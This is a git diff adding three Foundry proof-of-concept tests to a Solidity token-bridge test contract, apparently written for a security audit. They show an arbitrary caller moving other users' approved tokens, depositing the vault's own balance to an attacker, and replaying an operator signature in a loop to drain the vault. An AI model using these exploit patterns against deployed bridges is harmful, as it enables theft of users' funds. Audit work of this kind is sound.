@@ -223,4 +223,61 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    function test_arbitraryUserCanMoveEveryoneFunds() public {
+        uint256 amount = 10e18;
+        // 'user' approve bridge to spend 'amount'
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), amount);
+        uint256 userBalanceBeforeAttack = token.balanceOf(user);
+        vm.stopPrank();
+        // attacker
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, amount);
+        // deposit 'user' L1 funds to 'attacker' to L2
+        tokenBridge.depositTokensToL2(user, attacker, amount);
+        vm.stopPrank();
+        assertEq(token.balanceOf(user), userBalanceBeforeAttack - amount, "User funds not moved to attacker");
+        assertEq(token.balanceOf(address(vault)), amount, "Vault funds should increase.");
+    }
+
+    function test_canTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance);
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+        vm.stopPrank();
+    }
+
+    function test_signatureReplay() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultInitialBalance = 1000e18;
+        uint256 attackerInitialBalance = 100e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), attacker, attackerInitialBalance);
+
+        // an attacker deposits tokens to l2
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+        bytes memory message = abi.encode(
+            address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
+        );
+        (uint8 v, bytes32 r, bytes32 s) =
+            vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+        }
+        vm.stopPrank();
+        assertEq(
+            token.balanceOf(attacker),
+            attackerInitialBalance + vaultInitialBalance,
+            "Attacker balance should be higher."
+        );
+    }
 }
